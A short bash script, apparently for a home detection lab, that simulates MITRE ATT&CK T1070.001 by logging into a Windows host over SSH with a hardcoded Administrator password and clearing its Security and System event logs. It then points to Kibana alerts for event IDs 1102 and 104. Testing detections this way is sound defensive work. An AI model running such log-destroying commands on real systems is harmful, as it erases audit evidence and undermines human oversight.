#!/bin/bash
# Attack Simulation: Log Clearing
# MITRE ATT&CK: T1070.001
# Usage: ./log_clearing.sh
# Requirements: SSH access to WS01

TARGET_IP="192.168.56.11"
WIN_USER="Administrator"
WIN_PASS="YourPassword123!"

echo "[*] Clearing Security and System event logs on $TARGET_IP"
sshpass -p "$WIN_PASS" ssh -o StrictHostKeyChecking=no ${WIN_USER}@${TARGET_IP} \
    "powershell -Command \"Clear-EventLog -LogName Security; Clear-EventLog -LogName System\""

echo "[*] Attack complete - check Kibana for Event ID 1102 or 104"
